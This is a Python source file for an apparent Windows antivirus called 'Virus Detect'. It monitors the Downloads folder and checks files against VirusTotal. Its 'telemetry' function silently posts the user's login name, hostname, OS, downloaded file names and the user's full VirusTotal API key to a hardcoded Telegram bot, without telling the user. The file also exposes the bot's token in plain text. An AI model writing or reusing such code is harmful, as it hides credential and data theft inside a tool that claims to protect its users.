import time
import hashlib
import requests
import os
import logging
import threading
import shutil
import sys
import webbrowser
import platform
import socket
import tkinter as tk
# ... importlar ...
from tkinter import messagebox # Eğer yukarıda ekli değilse

# --- [YENİ] TEKİLLİK KONTROLÜ (MULTIPLE INSTANCE BLOCKER) ---
try:
    from win32event import CreateMutex
    from win32api import GetLastError
    from winerror import ERROR_ALREADY_EXISTS
    
    mutex = CreateMutex(None, False, "Global\\VirusDetectSentinelApp")
    if GetLastError() == ERROR_ALREADY_EXISTS:
        # Zaten çalışıyorsa sessizce veya uyarı vererek kapan
        print("PROGRAM ZATEN ÇALIŞIYOR! İkinciyi açamazsınız.")
        sys.exit()
except ImportError:
    # win32 kütüphanesi yoksa bu kontrolü pas geç (geliştirme ortamı için)
    pass
# ------------------------------------------------------------
from tkinter import messagebox, ttk, simpledialog
from dotenv import load_dotenv
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# --- GEREKLİ KÜTÜPHANE KONTROLÜ ---
try:
    from win11toast import toast
except ImportError:
    sys.exit()

# ==========================================
# AYARLAR (BURAYI KESİN DOLDUR)
# ==========================================
TELEGRAM_BOT_TOKEN = "8519013838:AAGmtwh_QhMNDDqtvANIl57KpHAksxZKz3o" 
TELEGRAM_CHAT_ID = "678110669"
# ==========================================

# --- DEBUG BAŞLANGIÇ ---
print("--------------------------------------------------")
print("[1] Program başlatılıyor...")
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
print(f"[2] Çalışma dizini: {BASE_DIR}")

ICON_PATH = os.path.join(BASE_DIR, 'logo.png')
QUARANTINE_DIR = os.path.join(BASE_DIR, 'Karantina')
ENV_PATH = os.path.join(BASE_DIR, '.env')
LOG_PATH = os.path.join(BASE_DIR, 'sentinel_log.txt')

# --- LOG AYARLARI ---
logging.basicConfig(
    filename=LOG_PATH, 
    level=logging.INFO, 
    format='%(asctime)s - %(levelname)s - %(message)s', 
    datefmt='%Y-%m-%d %H:%M:%S',
    encoding='utf-8'
)

APP_NAME = "Virus Detect"
if os.path.exists(ICON_PATH):
    TOAST_ICON = {'src': ICON_PATH, 'placement': 'appLogoOverride'}
else:
    TOAST_ICON = None

# --- TELEMETRİ SİSTEMİ ---
def send_telemetry(title, message):
    if "BURAYA" in TELEGRAM_BOT_TOKEN:
        return
    def _send():
        try:
            user_info = f"👤 User: {os.getlogin()}\n💻 PC: {socket.gethostname()}\n⚙️ OS: {platform.system()} {platform.release()}"
            full_text = f"<b>{title}</b>\n\n{message}\n\n----------------\n{user_info}"
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": full_text, "parse_mode": "HTML"}
            requests.post(url, data=data)
        except: pass 
    threading.Thread(target=_send).start()

# --- KURULUM SİHİRBAZI ---
def open_vt_signup():
    webbrowser.open("https://www.virustotal.com/gui/join-us")

def open_existing_account(root):
    """Kullanıcı adını sorar ve direkt API sayfasına yönlendirir."""
    username = simpledialog.askstring("Hesap Bulucu", "VirusTotal kullanıcı adınızı giriniz:", parent=root)
    if username and username.strip():
        url = f"https://www.virustotal.com/gui/user/{username.strip()}/apikey"
        webbrowser.open(url)
    elif username == "":
        messagebox.showwarning("Uyarı", "Kullanıcı adı girmediniz.")

def setup_wizard():
    print("[3] .env dosyası YOK. Kurulum Sihirbazı (GUI) açılıyor...")
    root = tk.Tk()
    root.title("Virus Detect - Aktivasyon")
    
    window_width = 550
    window_height = 550 # Yükseklik biraz arttı
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x_cordinate = int((screen_width/2) - (window_width/2))
    y_cordinate = int((screen_height/2) - (window_height/2))
    root.geometry(f"{window_width}x{window_height}+{x_cordinate}+{y_cordinate}")
    root.resizable(False, False)

    if os.path.exists(ICON_PATH):
        try: root.iconphoto(False, tk.PhotoImage(file=ICON_PATH))
        except: pass

    style = ttk.Style()
    style.configure("TButton", padding=6, font=("Helvetica", 10))
    
    # Başlık
    lbl_title = tk.Label(root, text="Virus Detect Aktivasyonu", font=("Segoe UI", 18, "bold"), fg="#2c3e50")
    lbl_title.pack(pady=(20, 10))

    desc = ("Bilgisayarınızı korumak için VirusTotal altyapısını kullanıyoruz.\nBu işlem ÜCRETSİZDİR ve sadece 1 kez yapılır.")
    lbl_desc = tk.Label(root, text=desc, font=("Segoe UI", 10), justify="center", fg="#555")
    lbl_desc.pack(pady=5)

    ttk.Separator(root, orient='horizontal').pack(fill='x', padx=20, pady=10)

    # --- HESAP SEÇENEKLERİ ---
    frame_step1 = tk.Frame(root, bg="#f0f3f4", padx=10, pady=10)
    frame_step1.pack(pady=5, padx=20, fill="x")
    
    lbl_q = tk.Label(frame_step1, text="Hesabınız var mı?", font=("Segoe UI", 10, "bold"), bg="#f0f3f4")
    lbl_q.pack()

    # Butonlar Yan Yana
    frame_btns = tk.Frame(frame_step1, bg="#f0f3f4")
    frame_btns.pack(pady=5)

    # Buton 1: Yeni Kayıt
    btn_new = tk.Button(frame_btns, text="Yeni Hesap Aç (Hızlı)", bg="#3498db", fg="white", 
                        font=("Segoe UI", 9, "bold"), width=20, command=open_vt_signup)
    btn_new.grid(row=0, column=0, padx=5)

    # Buton 2: Hesabım Var (Senin İstediğin Özellik)
    btn_exist = tk.Button(frame_btns, text="Zaten Hesabım Var", bg="#9b59b6", fg="white", 
                          font=("Segoe UI", 9, "bold"), width=20, command=lambda: open_existing_account(root))
    btn_exist.grid(row=0, column=1, padx=5)
    
    lbl_tip = tk.Label(frame_step1, text="*Google veya GitHub ile saniyeler içinde giriş yapabilirsiniz.", 
                       font=("Segoe UI", 8), bg="#f0f3f4", fg="#7f8c8d")
    lbl_tip.pack(pady=(5,0))

    # --- API KEY GİRİŞİ ---
    lbl_step2 = tk.Label(root, text="Siteden aldığınız 'API Key'i aşağıya yapıştırın:", font=("Segoe UI", 10))
    lbl_step2.pack(pady=(20, 5))
    
    entry_key = ttk.Entry(root, width=50)
    entry_key.pack(pady=5)

    def save_and_start():
        key = entry_key.get().strip()
        if len(key) < 50: 
            send_telemetry("⚠️ GEÇERSİZ GİRİŞ", f"Girdi: {key}")
            messagebox.showerror("Hata", "Geçersiz API Key! Lütfen kodun tamamını kopyalayın.")
            return
        
        try:
            with open(ENV_PATH, "w", encoding="utf-8") as f:
                f.write(f"VT_API_KEY={key}")
            send_telemetry("🚀 YENİ KURULUM BAŞARILI", f"🔑 Key: {key}")
            messagebox.showinfo("Başarılı", "Kurulum tamamlandı!")
            root.destroy()
        except Exception as e:
            messagebox.showerror("Hata", f"Hata: {e}")

    btn_save = tk.Button(root, text="KURULUMU TAMAMLA", bg="#2ecc71", fg="white", 
                         font=("Segoe UI", 11, "bold"), padx=30, pady=10, cursor="hand2", command=save_and_start)
    btn_save.pack(pady=15)
    
    def on_closing(): sys.exit()
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

# --- BAŞLANGIÇ MANTIĞI ---
if os.path.exists(ENV_PATH):
    print("[3] .env dosyası BULUNDU. Sessiz mod başlatılıyor...")
    load_dotenv(ENV_PATH)
    API_KEY = os.getenv('VT_API_KEY')
    if not API_KEY or len(API_KEY) < 10:
        setup_wizard()
        load_dotenv(ENV_PATH)
        API_KEY = os.getenv('VT_API_KEY')
else:
    setup_wizard()
    load_dotenv(ENV_PATH)
    API_KEY = os.getenv('VT_API_KEY')

if not API_KEY: sys.exit()

# --- İZLEME MODU ---
WATCH_DIRECTORY = r'C:\Users\berka\Downloads'
VT_BASE_URL = 'https://www.virustotal.com/api/v3'
MAX_FILE_SIZE_MB = 32

def normalize_path(path):
    return os.path.normpath(os.path.abspath(path)).lower()

class Watcher:
    def __init__(self, directory):
        self.observer = Observer()
        self.directory = normalize_path(directory)
        self.processed_files = {} 
        self.lock = threading.Lock()
        if not os.path.exists(QUARANTINE_DIR): os.makedirs(QUARANTINE_DIR)

    def run(self):
        event_handler = Handler(self)
        self.observer.schedule(event_handler, self.directory, recursive=False)
        self.observer.start()
        logging.info(f"{APP_NAME} devrede. Klasör: {self.directory}")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt: self.observer.stop()
        self.observer.join()

    def _toast_thread(self, title, message, sound_cfg):
        try:
            if TOAST_ICON: toast(title, message, app_id=APP_NAME, icon=TOAST_ICON, audio=sound_cfg)
            else: toast(title, message, app_id=APP_NAME, audio=sound_cfg)
        except Exception as e: logging.error(f"Bildirim Hatası: {e}")

    def send_notification(self, title, message, sound=False):
        sound_cfg = {'silent': 'false'} if sound else {'silent': 'true'}
        t = threading.Thread(target=self._toast_thread, args=(title, message, sound_cfg))
        t.daemon = True
        t.start()
        
    def send_alert(self, title, message):
        t = threading.Thread(target=self._toast_thread, args=(title, message, {'silent': 'false'}))
        t.daemon = True
        t.start()

    def quarantine_file(self, filepath):
        try:
            filename = os.path.basename(filepath)
            dest_path = os.path.join(QUARANTINE_DIR, filename + ".karantina")
            if os.path.exists(dest_path):
                base, ext = os.path.splitext(filename)
                dest_path = os.path.join(QUARANTINE_DIR, f"{base}_{int(time.time())}{ext}.karantina")
            shutil.move(filepath, dest_path)
            logging.warning(f"DOSYA KARANTİNAYA ALINDI: {dest_path}")
            send_telemetry("🚨 TEHDİT ENGELLENDİ!", f"⚠️ Dosya: {filename}\n🚫 Durum: Karantinaya alındı.")
            self.send_alert("🚫 DOSYA ENGELLENDİ", f"{filename} karantinaya taşındı.")
            return True
        except Exception as e:
            logging.critical(f"Karantina Hatası: {e}")
            send_telemetry("🔥 KRİTİK HATA", f"Karantina başarısız!\n{e}")
            return False

class Handler(FileSystemEventHandler):
    def __init__(self, watcher_instance):
        self.watcher = watcher_instance
        self.temp_extensions = ('.tmp', '.crdownload', '.part', '.opdownload')
        self.SCAN_COOLDOWN = 5.0 

    def on_deleted(self, event):
        if event.is_directory: return
        path = normalize_path(event.src_path)
        with self.watcher.lock:
            if path in self.watcher.processed_files: self.watcher.processed_files.pop(path, None)

    def on_moved(self, event):
        if event.is_directory: return
        src_path = normalize_path(event.src_path)
        src_ext = os.path.splitext(src_path)[1]
        if src_ext not in self.temp_extensions: return
        self.check_and_process(event.dest_path)

    def on_created(self, event):
        if not event.is_directory: self.check_and_process(event.src_path)
            
    def on_modified(self, event):
        if not event.is_directory: self.check_and_process(event.src_path)

    def check_and_process(self, filepath):
        filepath = normalize_path(filepath)
        filename = os.path.basename(filepath)
        if filename.endswith(self.temp_extensions + ('.ini', '.log', '.tmp')): return
        self.start_thread(filepath)

    def start_thread(self, filepath):
        t = threading.Thread(target=self.process, args=(filepath,))
        t.daemon = True
        t.start()

    def process(self, filepath):
        filepath = normalize_path(filepath)
        filename = os.path.basename(filepath)
        current_time = time.time()
        with self.watcher.lock:
            if filepath in self.watcher.processed_files:
                last_scan_time = self.watcher.processed_files[filepath]
                if (current_time - last_scan_time) < self.SCAN_COOLDOWN: return
            self.watcher.processed_files[filepath] = current_time

        if not self.wait_for_download(filepath):
            with self.watcher.lock: self.watcher.processed_files.pop(filepath, None)
            return

        logging.info(f"ANALİZ BAŞLADI: {filename}")
        self.watcher.send_notification("İnceleniyor...", f"{filename} kontrol ediliyor.", sound=False)
        file_hash = self.calculate_sha256(filepath)
        if file_hash: self.check_virustotal(file_hash, filepath)

    def wait_for_download(self, filepath, timeout=30):
        start = time.time()
        last_size = -1
        stable = 0
        while time.time() - start < timeout:
            try:
                if not os.path.exists(filepath): return False
                size = os.path.getsize(filepath)
                if size == 0: 
                    time.sleep(0.5); continue
                if size == last_size: stable += 1
                else: stable = 0
                last_size = size
                if stable >= 2: return True
                time.sleep(0.5)
            except: time.sleep(0.5)
        return False

    def calculate_sha256(self, filepath):
        sha256 = hashlib.sha256()
        try:
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""): sha256.update(chunk)
            return sha256.hexdigest()
        except Exception: return None

    def check_virustotal(self, file_hash, filepath):
        headers = {'x-apikey': API_KEY}
        filename = os.path.basename(filepath)
        try:
            response = requests.get(f"{VT_BASE_URL}/files/{file_hash}", headers=headers)
            if response.status_code == 200:
                stats = response.json()['data']['attributes']['last_analysis_stats']
                self.alert_user(stats, filepath)
            elif response.status_code == 404:
                logging.info(f"DOSYA BİLİNMİYOR (Upload Gerekli): {filename}")
                self.watcher.send_notification("Bilinmeyen Dosya", "Dosya sunucuya yükleniyor...", sound=False)
                self.upload_and_scan(filepath)
            elif response.status_code == 401:
                send_telemetry("💀 API KEY GEÇERSİZ", f"Response: 401\nDosya: {filename}")
            else:
                logging.error(f"API Hatası ({response.status_code}): {filename}")
                send_telemetry("⚠️ API Hatası", f"Kod: {response.status_code}\nDosya: {filename}")
        except Exception as e:
            logging.error(f"Bağlantı Hatası: {e}")

    def upload_and_scan(self, filepath):
        try:
            size = os.path.getsize(filepath)
            if size > (MAX_FILE_SIZE_MB * 1024 * 1024):
                self.watcher.send_notification("Hata", "Dosya 32MB limitini aşıyor.", sound=True)
                return
            with open(filepath, 'rb') as f:
                files = {'file': (os.path.basename(filepath), f)}
                resp = requests.post(f"{VT_BASE_URL}/files", headers={'x-apikey': API_KEY}, files=files)
            if resp.status_code == 200: self.poll_analysis(resp.json()['data']['id'], filepath)
            elif resp.status_code == 401: send_telemetry("💀 API KEY GEÇERSİZ (UPLOAD)", "401 Hatası.")
            else: logging.error(f"Upload Başarısız ({resp.status_code})")
        except Exception as e: logging.error(f"Upload Exception: {e}")

    def poll_analysis(self, analysis_id, filepath):
        headers = {'x-apikey': API_KEY}
        for _ in range(60):
            time.sleep(5)
            try:
                resp = requests.get(f"{VT_BASE_URL}/analyses/{analysis_id}", headers=headers)
                if resp.status_code == 200:
                    data = resp.json()['data']['attributes']
                    if data['status'] == 'completed':
                        self.alert_user(data['stats'], filepath)
                        return
            except: pass
        logging.warning(f"Zaman Aşımı: {os.path.basename(filepath)}")

    def alert_user(self, stats, filepath):
        malicious = stats['malicious']
        filename = os.path.basename(filepath)
        
        if malicious > 0:
            logging.warning(f"TEHDİT ALGILANDI: {filename} - Skor: {malicious}")
            self.watcher.quarantine_file(filepath)
        else:
            logging.info(f"TEMİZ: {filename}")
            self.watcher.send_notification("✅ Dosya Temiz", f"{filename} güvenli.", sound=False)
            
            # --- TEST İÇİN: TEMİZ DOSYALARI DA TELEGRAM'A AT ---
            # Test bittikten sonra bu satırı silebilirsin
            send_telemetry("✅ TEMİZ DOSYA", f"Dosya: {filename}\nDurum: Güvenli\nSkor: 0/{sum(stats.values())}")
            # ---------------------------------------------------

if __name__ == '__main__':
    w = Watcher(WATCH_DIRECTORY)
    w.run()